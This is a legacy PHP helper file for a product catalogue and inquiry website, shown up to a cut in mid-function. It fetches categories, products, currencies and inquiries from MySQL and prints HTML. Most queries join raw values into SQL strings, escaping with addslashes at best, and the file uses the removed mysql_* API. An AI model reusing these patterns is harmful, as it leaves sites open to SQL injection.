<?php

$Clr1="1c5483";		//Heading Bg Color
$Clr2="E8EEF3";		//Add Form Bg Color
$Clr3="E8EEF3";		//Manage Table bg Color

$swidth=149;
$sheight=175;

$lwidth=389;
$lheight=381;

@mysql_connect(_db_host_, _db_user_, _db_pass_) or die(mysql_error());
@mysql_select_db(_db_name_);

function _e($value){ echo $value; }
function _c(){ _e("<div class=\"fl_clear\"></div>"); }


function _h($value, $s=false){
	echo '<h2 class="heading">'.$value.'</h2>';
}

function wrap_last_word($text, $wrap='span'){
	$wordarray = explode(' ', $text);
	if (count($wordarray) > 1 ) {
		$wordarray[count($wordarray)-1] = '<'.$wrap.'>'.($wordarray[count($wordarray)-1]).'</'.$wrap.'>';
		$text = implode(' ', $wordarray);
	}
	return $text;
}


/*
FILTER FUNCTIONS
*/
if( isset($_SESSION['filter']) and !empty($_SESSION['filter']) ){
	$_FILTER_TYPE = $_SESSION['filter'];
	$_FILTER_SIZE_ID = ( isset($_SESSION['filter_size_id']) and is_numeric($_SESSION['filter_size_id']) ) ? $_SESSION['filter_size_id'] : false;
	$_FILTER_COLOR_ID = ( isset($_SESSION['filter_color_id']) and is_numeric($_SESSION['filter_color_id']) ) ? $_SESSION['filter_color_id'] : false;
}else{
	$_FILTER_TYPE = false;
	$_FILTER_SIZE_ID = false;
	$_FILTER_COLOR_ID = false;
}


function in_filter($PRD_ID, $size_ID, $color_ID){

	$rt = true;

	if( $size_ID ){
		$size_query = mysql_query("SELECT * FROM `tblprodsize` WHERE `SizeID`=".$size_ID." AND `Pid`=".$PRD_ID);
		$rt = ( mysql_num_rows($size_query) > 0 ) ? true : false;
	}

	if( $color_ID ){
		$color_query = mysql_query("SELECT * FROM `tblprodcolor` WHERE `ColorID`=".$color_ID." AND `Pid`=".$PRD_ID);
		$rt = ( mysql_num_rows($color_query) > 0 ) ? true : false;
	}

	return $rt;

}


function increment_artno($artno){
	
	$added = false;

	$new_artno = "";

	if( substr_count($artno, "-") > 0 ){
		$dd = "-";
		$at = explode("-", $artno);
	}elseif( substr_count($artno, ".") > 0 ){
		$dd = ".";
		$at = explode(".", $artno);
	}else{
		return ++$artno;
	}

	$c_dash = (count($at)-1);
	while( $c_dash >= 0 ){
		if( is_numeric($at[$c_dash]) and !$added ){ $at[$c_dash] = sprintf('%0'.strlen($at[$c_dash]).'d', $at[$c_dash]+1); $added = true; }
		$c_dash--;
	}

	for ($i=0; $i < count($at); $i++) { 
		$new_artno .= $at[$i];
		if( $i < (count($at)-1) ){ $new_artno .= $dd; }
	}

	return $new_artno;

}


function get_max_category_link($ID){

	$current = $ID;
	$current_parent = get_cateogry( $ID, 'parrent' );
	$current_slug = get_cateogry( $ID, 'slug' );

	$link = _root_.'products/'.$current_slug.'/';

	while( 1 ){
		if( does_category_has_subs($current) ){
			
			$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$current." AND `show`='y' ORDER BY `rank` ASC LIMIT 0, 1");
			$RS = mysql_fetch_array($query);
			$link = $link.$RS['slug'].'/';
			$current = $RS['id'];

		}else{
			break;
		}
	}

	return $link;

}


function category($ID, $col='col-xs-12', $class=false){

	global $__url_attimgs;

	$RS_cat = get_category($ID);

	//if( $col ){ _e('<div class="'.$col.'">'); }

    _e('<div class="col-xs-12 col-sm-12 col-md-4 col-lg-4 no-padding '.$class.'">');

    	_e('<div class="top-servic-box">');
	    	_e('<figure> <img src="'.$__url_attimgs.$RS_cat['img_thumb'].'" alt="'.$RS_cat['name'].'" title="'.$RS_cat['name'].'"> </figure>');

	    	_e('<div class="content">');
	    		_e('<div class="price"> </div>');
	    		_e('<h3><a href="'.get_first_subcat_link($RS_cat['id']).'">'.$RS_cat['name'].'</a></h3>');
	    		_e('<div class="clearfix"> </div>');
	    		_e('<a class="site-permalink" href="'.get_first_subcat_link($RS_cat['id']).'"> <span>MORE</span> <i class="icon-service-arrow"></i> </a>');
	    	_e('</div>');
    	_e('</div>');

    _e('</div>');

	//if( $col ){ _e('</div>'); }

}


function get_prd_link(){
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=0 AND `show`='y' ORDER BY `rank` ASC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS_main = mysql_fetch_array($query);
		$query_sub = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$RS_main['id']." AND `show`='y' ORDER BY `rank` ASC LIMIT 0, 1");
		if( mysql_num_rows($query_sub) > 0 ){
			$RS_sub = mysql_fetch_array($query_sub);
			_e(_root_."products/".$RS_main['slug']."/".$RS_sub['slug']."/");
		}else{
			_e(_root_."products/".$RS_main['slug']."/");
		}
	}else{
		return;
	}
}

function get_first_subcat_link($ID){
	$main = get_cateogry( $ID );
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$ID." AND `show`='y' ORDER BY `rank` ASC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return _root_."products/".$main['slug']."/".$RS['slug']."/";
	}else{
		return _root_."products/".$main['slug']."/";
	}
}

function get_category($ID, $data=false){
	return get_cateogry($ID, $data);
}

//chk_currency();


function get_sub_query_list($cat_id){
	
	$sub_cats = array();
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$cat_id);
	while( $RS_sub = mysql_fetch_array($query) ){
		array_push($sub_cats, $RS_sub['id']);
	}
	return implode(',', array_map('intval', $sub_cats));
}


function sub_cat_has_grp($cat_id, $grp="fet", $min=1){
	if( does_category_has_subs($cat_id) ){
		$query = mysql_query("SELECT * FROM `products` WHERE `parent` IN (" . get_sub_query_list($cat_id) . ") AND `grp_".$grp."`='y' AND `show`='y'");
	}else{
		$query = mysql_query("SELECT * FROM `products` WHERE `parent`=".$cat_id." AND `grp_".$grp."`='y' AND `show`='y'");
	}
	$num = mysql_num_rows($query);
	return ( $num > $min ) ? true : false;
}



function category_link_first_sub($ID){
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$ID." ORDER BY `rank` ASC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return _root_."products/".get_cateogry($ID, "slug")."/".$RS['slug']."/";
	}else{
		return _root_."products/".get_cateogry($ID, "slug");
	}
}


function get_full_category_link( $ID ){
	
	$url = _root_.'products/';

	while( 1 ){
		$url = $url.get_category($ID, "slug")."/";

		$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$ID." ORDER BY `rank` ASC LIMIT 0, 1");
		if( mysql_num_rows($query) > 0 ){
			$RS = mysql_fetch_array($query);
			$ID = $RS['id'];
		}else{
			break;
		}

	}

	return $url;

}


function only_img($ext){
	$ext_allowed = array('jpg', 'JPG', 'gif', 'GIF', 'png', 'PNG', 'icon', 'ICON');
	return ( in_array($ext, $ext_allowed) ) ? true : false;
}


function get_category_link($ID){

	$parent = get_category($ID, 'parent');

	if( $parent == 0 ){
		return _root_.'products/'.get_category($ID, 'slug').'/';
	}else{
		$link = "";

		while ( 1 ){
			if( $parent == 0 ){
				$link = get_category($ID, 'slug')."/".$link;
				break;
			}else{

				$link = get_category($ID, 'slug')."/".$link;
				$ID = get_category($ID, 'parent');
				$parent = get_category($ID, 'parent');

			}
		}

		return _root_.'products/'.$link;
	}

}


function prd_link(){
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=0 ORDER BY `rank` ASC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return category_link_first_sub($RS['id']);
	}else{
		return _root_."products/";
	}
}

function get_category_sub_link($ID){
	$c_cat = get_cateogry($ID);
	$parent = $c_cat['parent'];
	if( $parent == 0 ){
		return _root_.'products/'.$c_cat['slug'];
	}else{
		$RT = $c_cat['slug'];
		while ( 1 ){
			$s_cat = get_cateogry($parent);
			$RT = $s_cat['slug']."/".$RT;
			$parent = $s_cat['parent'];
			if( $parent == 0 ){ break; }
		}
		return _root_.'products/'.$RT;
		//return _root_.'products/'.$c_cat['slug'];
	}
}

function category_ID_from_slug($slug){
	$slug = esc($slug);
	$query = mysql_query("SELECT * FROM `categories` WHERE `slug`='".$slug."'");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['id'];
	}else{
		return false;
	}
}

function chk_currency(){
	if( ! isset($_SESSION['currency']) ){
		$query = mysql_query("SELECT * FROM `exchange` ORDER BY `id` ASC LIMIT 0, 1");
		if( mysql_num_rows($query) > 0 ){
			$RS = mysql_fetch_array($query);
			$_SESSION['currency'] = $RS['id'];
		}
	}
}

function current_currency($get=false){
	global $__url_attimgs;
	$query = mysql_query("SELECT * FROM `exchange` WHERE `id`=".$_SESSION['currency']);
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		switch($get) {
			case 'name': return $RS['name']; break;
			case 'rate': case 'exchange': return $RS['rate']; break;
			case 'symbol': case 'sign': return $RS['symbol']; break;
			case 'abbreviation': case 'abb': return $RS['abbreviation']; break;
			case 'image': return $RS['image']; break;
			case 'icon': return $__url_attimgs.$RS['image']; break;
			default: return $RS; break;
		}
	}
}


function fiter_is_set(){
	return ( isset($_SESSION['filter']) and !empty($_SESSION['filter']) ) ? true : false;
}

function get_unit($ID, $def='Pcs'){
	$product = get_product($ID);
	if( !empty( $product['ex_txt_12'] ) ){ return $product['ex_txt_12']; }else{ return $def; }
}

function is_valide_currency($cur){
	if( is_numeric($cur) ){
		$query = mysql_query("SELECT `id` FROM `exchange` WHERE `id`=".$cur);
	}else{
		$query = mysql_query("SELECT `id` FROM `exchange` WHERE `abbreviation`='".$cur."'");
	}	
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}


function get_currency($cur, $get=false){
	if( is_numeric($cur) ){
		$query = mysql_query("SELECT * FROM `exchange` WHERE `id`=".$cur." LIMIT 0, 1");
	}else{
		$query = mysql_query("SELECT * FROM `exchange` WHERE `abbreviation`='".$cur."' LIMIT 0, 1");
	}

	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'name': return $RS['name']; break;
				case 'rate': return $RS['rate']; break;
				case 'symbol': return $RS['symbol']; break;
				case 'abbreviation': return $RS['abbreviation']; break;
				case 'image': return $RS['image']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_variation($id, $get=false){
	
	$query = mysql_query("SELECT * FROM `variations` WHERE `id`=".$id." LIMIT 0, 1");

	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'name': return $RS['name']; break;
				case 'description': return $RS['description']; break;
				case 'rank': return $RS['rank']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}


function print_attributes($variation_id){

	$query = mysql_query("SELECT * FROM `attributes` WHERE `variation_id`=".$variation_id." ORDER BY `rank` ASC");
	
	$num = mysql_num_rows($query);
	if( $num > 0 ){
		$all_attributes = array();
		while( $RS = mysql_fetch_array($query) ){
			array_push($all_attributes, $RS['name']);
		}

		$k = 0;
		while( $k < $num ){
			_e( $all_attributes[$k] );
			if( $k < ($num-1) ){ _e(", "); }
			$k++;
		}

	}else{
		return false;
	}
}


function print_product_attributes($variation_id, $prd_id){
	$query = mysql_query("SELECT * FROM `prd_attributes` WHERE `prd_id`=".$prd_id." AND `variation_id`=".$variation_id." ORDER BY `id` ASC");
	$num = mysql_num_rows($query);
	if( $num > 0 ){
		
		$all_attributes = array();

		while( $RS = mysql_fetch_array($query) ){
			array_push($all_attributes, get_attribute($RS['attribute_id'], "name"));
		}

		$k = 0;
		$rt = "";
		while( $k < $num ){
			$rt .= $all_attributes[$k];
			if( $k < ($num-1) ){ $rt .= ", "; }
			$k++;
		}

		return $rt;

	}else{
		return false;
	}
}

function print_product_check_attributes( $variation_id, $prd_id, $color=false ){
	$query = mysql_query("SELECT * FROM `prd_attributes` WHERE `prd_id`=".$prd_id." AND `variation_id`=".$variation_id." ORDER BY `id` ASC");
	$num = mysql_num_rows($query);
	if( $num > 0 ){
		
		$all_attributes = array();

		while( $RS = mysql_fetch_array($query) ){
			array_push($all_attributes, $RS['attribute_id']);
		}

		$k = 0;
		$rt = "";
		while( $k < $num ){
			$rt .= '<div class="att-wrapper color">';
			$rt .= '<input id="at_'.$all_attributes[$k].'" type="checkbox" name="at_'.$all_attributes[$k].'" value="at_'.$all_attributes[$k].'">';
			$rt .= '<label for="at_'.$all_attributes[$k].'">'.get_attribute($all_attributes[$k], "name").'</label>';
			//$rt .= $all_attributes[$k];
			$rt .= '</div>';
			$k++;
		}

		return $rt;

	}else{
		return false;
	}
}


function prd_has_variation($prd_id, $variation_id){
	$query = mysql_query("SELECT * FROM `prd_attributes` WHERE `prd_id`=".$prd_id." AND `variation_id`=".$variation_id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function prd_has_attribute($prd_id, $attribute_id){
	$query = mysql_query("SELECT * FROM `prd_attributes` WHERE `prd_id`=".$prd_id." AND `attribute_id`=".$attribute_id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function prd_has_any_attribute($prd_id){
    $query = mysql_query("SELECT * FROM `prd_attributes` WHERE `prd_id`=".$prd_id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function prd_has_any_inquiry_attribute($inquiry_id, $product_id){
    $query = mysql_query("SELECT * FROM `inquiry_attributes` WHERE `inquiry_id`=".$inquiry_id." AND `product_id`=".$product_id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function prd_has_this_inquiry_attribute($inquiry_id, $product_id, $attribute_id){
    $query = mysql_query("SELECT * FROM `inquiry_attributes` WHERE `inquiry_id`=".$inquiry_id." AND `attribute_id`=".$attribute_id." AND `product_id`=".$product_id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function print_product_inquiry($inquiry_id, $product_id){

	$query_variation = mysql_query("SELECT * FROM `variations` ORDER BY `rank` ASC");
	if( mysql_num_rows($query_variation) > 0 ){
		
		$rt = "";

		while( $RS_variation = mysql_fetch_array($query_variation) ){
			if( prd_has_variation($product_id, $RS_variation['id']) ){
				
				$inq_attributes = print_product_inquiry_attributes($inquiry_id, $RS_variation['id'], $product_id);

				if( $inq_attributes and !empty($inq_attributes) ){
					$rt .= '<div class="">'.get_variation($RS_variation['id'], "name").': '.$inq_attributes.'</div>';
				}

			}
		}

		return $rt;


	}else{
		return false;
	}

}


function print_product_inquiry_attributes($inquiry_id, $variation_id, $product_id){
	
	$query = mysql_query("SELECT * FROM `prd_attributes` WHERE `prd_id`=".$product_id." AND `variation_id`=".$variation_id." ORDER BY `id` ASC");
	$num = mysql_num_rows($query);
	if( $num > 0 ){

		$all_attributes = array();
		$rt = "";

		while( $RS = mysql_fetch_array($query) ){			
			if( prd_has_this_inquiry_attribute( $inquiry_id, $product_id, $RS['attribute_id'] ) ){
				array_push($all_attributes, get_attribute($RS['attribute_id'], "name"));
			}
		}

		$num = count($all_attributes);

		if( $num > 0 ){

			$i = 1;
			foreach ($all_attributes as $att) {
				$rt = $rt . $att;
				if( $i < $num ){ $rt = $rt .", "; }
				$i++;
			}

			return $rt;

		}else{
			return false;
		}

	}else{
		return false;
	}

}

function delete_product_from_inquiry($product_id, $inquiry_id=false){

	if(!$inquiry_id){ $inquiry_id = inquiry_sec_to_id(); }

	$del0 = mysql_query("DELETE FROM `inquiry_products` WHERE `product_id`=".$product_id." AND `inquiry_id`=".$inquiry_id);
	$del1 = mysql_query("DELETE FROM `inquiry_attributes` WHERE `product_id`=".$product_id." AND `inquiry_id`=".$inquiry_id);

	return ( $del0 and $del1 ) ? true : false;

}

function get_variation_group($id, $get=false){
	return get_group($id, $get);
}

function get_group($id, $get=false){
	
	$query = mysql_query("SELECT * FROM `variation_groups` WHERE `id`=".$id." LIMIT 0, 1");

	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'name': return $RS['name']; break;
				case 'rank': return $RS['rank']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}


function get_attribute($id, $get=false){
	
	$query = mysql_query("SELECT * FROM `attributes` WHERE `id`=".$id." LIMIT 0, 1");

	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'variation_id': case 'variation': return $RS['variation_id']; break;
				case 'name': return $RS['name']; break;
				case 'x_data': return $RS['x_data']; break;
				case 'rank': return $RS['rank']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}



// GENERATS A RANDOM KEY
function randomKey($length = 10, $return = true){
	$chars = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "o", "p", "r", "s", "t", "u", "v", "x", "y", "z");
	$numbers = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
	$key = "";
	mt_srand((double) microtime() * 1000000);
	for ($i = 1; $i <= $length; $i++){
		$key .= ($i%2 == 0) ? $chars[mt_rand(0, count($chars)-1)] : $numbers[mt_rand(0, count($numbers)-1)];
	}
	if( $return ){ return $key; }else{ _e($key); }
}


// REMOVE THE FILE EXTENTION AND RETURN THE FILE NAME
function get_file_name($filename){
	$ext = strrchr($filename, '.');
	if($ext !== false){ $filename = substr($filename, 0, -strlen($ext)); }
	return $filename;
}


// REMOVE THE FILE NAME AND RETURN THE FILE EXTENTION
function get_file_extension($filename){
	$ext = strrchr($filename, '.');
	if($ext !== false){ $ext = substr($ext, 1); }else{ $ext = ''; }
	return $ext;
}

function esc($value){
	return addslashes( $value );
}

function is_valide_category($id){
	$query = mysql_query("SELECT `id` FROM `categories` WHERE `id`=".$id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function is_valide_product($id){
	$query = mysql_query("SELECT `id` FROM `products` WHERE `id`=".$id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function is_valide_page($id){
	$query = mysql_query("SELECT `id` FROM `pages` WHERE `id`=".$id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}



function top_rank($table, $where=false){
	$where = ( $where ) ? " WHERE ".$where : "";
	$query = mysql_query("SELECT `rank` FROM `".$table."`".$where." ORDER BY `rank` ASC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}


function bottom_rank($table, $where=false){
	$where = ( $where ) ? " WHERE ".$where : "";
	$query = mysql_query("SELECT `rank` FROM `".$table."`".$where." ORDER BY `rank` DESC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}


function get_next_rank($table, $where=false){
	$where = ( $where ) ? " WHERE ".$where : "";
	$query = mysql_query("SELECT `rank` FROM `".$table."`".$where." ORDER BY `rank` DESC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'] + 1;
	}else{
		return 1;
	}
}


function num($table, $where=false){
	$where = ( $where ) ? " WHERE ".$where : "";
	$query = mysql_query("SELECT `rank` FROM `".$table."`".$where."");
	return mysql_num_rows($query);
}


function get_next_category_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `categories` WHERE `parent`=".$parent." ORDER BY `rank` DESC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'] + 1;
	}else{
		return 1;
	}
}

function get_next_banner_image_rank($banner){
	$query = mysql_query("SELECT `rank` FROM `banner_images` WHERE `banner`=".$banner." ORDER BY `rank` DESC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'] + 1;
	}else{
		return 1;
	}
}

function get_next_product_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `products` WHERE `parent`=".$parent." ORDER BY `rank` DESC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'] + 1;
	}else{
		return 1;
	}
}

function str_to_slug($str){
	$str = strtolower(trim($str));
	$str = preg_replace('/[^a-z0-9-]/', '-', $str);
	$str = preg_replace('/-+/', "-", $str);
	return $str;
}

function prd_str_to_slug($str){
	$str = trim($str);
	$str = preg_replace('/[^A-Za-z0-9-]/', '-', $str);
	$str = preg_replace('/-+/', "-", $str);
	return $str;
}

function make_category_slug($str, $id=false){
	$str = str_to_slug($str);

	if( does_category_slug_exists($str, $id) ){
		$n = 1;
		while( 1 ){
			$new_str = $str.'-'.$n;
			if( does_category_slug_exists($new_str, $id) ){ $n++; } else{ return $new_str; break; }
		}
	}else{
		return $str;
	}
}

function does_category_slug_exists($slug, $id=false){
	if( $id ){
		$query = mysql_query("SELECT `id` FROM `categories` WHERE `slug`='".$slug."' AND `id`!=".$id." LIMIT 0, 1");
	}else{
		$query = mysql_query("SELECT `id` FROM `categories` WHERE `slug`='".$slug."' LIMIT 0, 1");
	}
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function does_category_slug_parent_exists($slug, $parent){
	$query = mysql_query("SELECT `id` FROM `categories` WHERE `slug`='".$slug."' AND `parent`=".$parent." LIMIT 0, 1");
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function make_category_slug_parent($str, $parent){
	$str = str_to_slug($str);

	if( does_category_slug_parent_exists($str, $parent) ){
		$n = 1;
		while( 1 ){
			$new_str = $str.'-'.$n;
			if( does_category_slug_parent_exists($new_str, $parent) ){ $n++; } else{ return $new_str; break; }
		}
	}else{
		return $str;
	}
}

function make_product_slug($str, $id=false){
	$str = str_to_slug($str);

	if( does_product_slug_exists($str, $id) ){
		$n = 1;
		while( 1 ){
			$new_str = $str.'-'.$n;
			if( does_product_slug_exists($new_str, $id) ){ $n++; } else{ return $new_str; break; }
		}
	}else{
		return $str;
	}
}

function does_product_slug_exists($slug, $id=false){
	if( $id ){
		$query = mysql_query("SELECT `id` FROM `products` WHERE `slug`='".$slug."' AND `id`!=".$id." LIMIT 0, 1");
	}else{
		$query = mysql_query("SELECT `id` FROM `products` WHERE `slug`='".$slug."' LIMIT 0, 1");
	}
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function does_category_has_subs($id){
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function has_products($id){
	$query = mysql_query("SELECT `id` FROM `products` WHERE `parent`=".$id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function dash_parent_level($ID){
    $d = '';
    while(1){
        if( get_cateogry($ID, 'parent') == 0 ){
            break;
        }else{
            $ID = get_cateogry($ID, 'parent');
            $d .= '- ';
        }
    }
    return $d;
}

function print_category_subs_options($parentid, $lvl=1){
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$parentid." ORDER BY `rank` ASC");
	if( mysql_num_rows($query) > 0 ){
		while( $RS = mysql_fetch_array($query) ){
			_e('<option value="'.$RS['id'].'">'.get_levels($lvl).$RS['name'].'</option>');
			if( does_category_has_subs($RS['id']) ){ print_category_subs_options( $RS['id'], ($lvl+1) ); }
		}
	}else{
		return;
	}
}

function print_category_subs_options_1($parentid, $lvl=1, $c=false){
	if( !is_numeric($c) ){ $c = false; }
	if( $c and $c==$parentid ){ return false; }
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$parentid." ORDER BY `rank` ASC");
	if( mysql_num_rows($query) > 0 ){
		while( $RS = mysql_fetch_array($query) ){
			//if( $RS['id'] != $c and !does_category_has_subs($RS['id']) ){
			//if( $RS['id'] != $c ){
				_e('<option value="'.$RS['id'].'"');
				if( $RS['id'] == $c ){ _e(" selected"); }
				_e('>'.dash_parent_level($RS['id']).$RS['name'].'</option>');
				if( does_category_has_subs($RS['id'], $c) ){ print_category_subs_options_1( $RS['id'], ($lvl+1), $c ); }
			//}
			//}
		}
	}else{
		return;
	}
}

function get_levels($lvl){	
	if( $lvl < 1 ){ return; }
	$rt = "";
	for ($i=1; $i <= $lvl; $i++){
		$rt .= "&mdash; ";
	}
	return $rt;
}

function get_category_breadcrumbs($ID, $full=false){

	if( $ID == 0 ){
		_e( '<a href="'._root_.'">Home</a>' );
		_e( '<i class="fa fa-chevron-right" aria-hidden="true"></i>' );
		_e( '<span>Products</span>' );
		return;
	}

	$parent = get_category($ID, 'parent');
	$__ID = $ID;

	_e( '<a href="'._root_.'">Home</a>' );
	_e( '<i class="fa fa-chevron-right" aria-hidden="true"></i>' );
	_e( '<a href="'._root_.'products/">Products</a>' );
	_e( '<i class="fa fa-chevron-right" aria-hidden="true"></i>' );

	if( $parent == 0 ){
		_e( '<span>'.get_category($ID, 'name').'</span>' );
	}else{


		$link = "";

		while ( 1 ){

			if( $parent == 0 ){
				$link = '<a href="'.get_category_link($ID).'">'.get_category($ID, 'name').'</a><i class="fa fa-chevron-right" aria-hidden="true"></i>'.$link;
				break;
			}else{

				if( !$full and $__ID == $ID ){
					$link = '<span>'.get_category($ID, 'name').'</span>'.$link;
				}else{
					$link = '<a href="'.get_category_link($ID).'">'.get_category($ID, 'name').'</a><i class="fa fa-chevron-right" aria-hidden="true"></i>'.$link;
				}

				$ID = get_category($ID, 'parent');
				$parent = get_category($ID, 'parent');

			}
		}

		_e( $link );
	}

}

function get_cateogry($id, $get=false){
	$query = mysql_query("SELECT * FROM `categories` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'name': return $RS['name']; break;
				case 'slug': return $RS['slug']; break;
				case 'title': return $RS['title']; break;
				case 'keywords': return $RS['keywords']; break;
				case 'description': return $RS['description']; break;
				case 'parent': return $RS['parent']; break;
				case 'rank': return $RS['rank']; break;
				case 'show': return $RS['show']; break;
				case 'is_show': return ( $RS['show'] == 'y' ) ? true : false; break;
				case 'img_thumb': return $RS['img_thumb']; break;
				case 'img_banner': return $RS['img_banner']; break;
				case 'img_x': return $RS['img_x']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_product($id, $get=false){
	$query = mysql_query("SELECT * FROM `products` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'parent': return $RS['parent']; break;
				case 'art_no': return $RS['art_no']; break;
				case 'slug': return $RS['slug']; break;
				case 'name': return $RS['name']; break;
				case 'mini_description': return $RS['mini_description']; break;
				case 'description': return $RS['description']; break;
				case 'price': return $RS['price']; break;
				case 'rank': return $RS['rank']; break;
				case 'grp_fet': return $RS['grp_fet']; break;
				case 'grp_new': return $RS['grp_new']; break;
				case 'grp_hot': return $RS['grp_hot']; break;
				case 'img_small': return $RS['img_small']; break;
				case 'img_large': return $RS['img_large']; break;
				case 'img_xlarge': return $RS['img_xlarge']; break;
				case 'show': return $RS['show']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}


function get_banner($id, $data=false){
	$query = mysql_query("SELECT * FROM `banners` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $data ){
			switch ($data) {
				case 'name': return $RS['name']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_widget_areas($id, $data=false){
	$query = mysql_query("SELECT * FROM `widget_areas` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $data ){
			switch ($data) {
				case 'name': return $RS['name']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_widget($id, $data=false){
	$query = mysql_query("SELECT * FROM `widgets` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $data ){
			switch ($data) {
				case 'area_id': return $RS['area_id']; break;
				case 'name': return $RS['name']; break;
				case 'field_1': return $RS['field_1']; break;
				case 'field_2': return $RS['field_2']; break;
				case 'field_3': return $RS['field_3']; break;
				case 'field_4': return $RS['field_4']; break;
				case 'field_5': return $RS['field_5']; break;
				case 'field_6': return $RS['field_6']; break;
				case 'field_7': return $RS['field_7']; break;
				case 'rank': return $RS['rank']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function num_inquiry_products($id){
	return mysql_result(mysql_query("SELECT count(*) FROM `inquiry_products` WHERE `inquiry_id`=".$id),0);
}

function get_inquiry($id, $data=false){
	$query = mysql_query("SELECT * FROM `inquiry` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $data ){
			switch ($data) {
				case 'session_id': return $RS['session_id']; break;
				case 'first_name': return $RS['first_name']; break;
				case 'last_name': return $RS['last_name']; break;
				case 'company_name': return $RS['company_name']; break;
				case 'phone': return $RS['phone']; break;
				case 'fax': return $RS['fax']; break;
				case 'email': return $RS['email']; break;
				case 'city': return $RS['city']; break;
				case 'state': return $RS['state']; break;
				case 'country': return $RS['country']; break;
				case 'address': return $RS['address']; break;
				case 'message': return $RS['message']; break;
				case 'date': return $RS['date']; break;
				case 'submitted': return $RS['submitted']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_banner_image($id, $data=false){
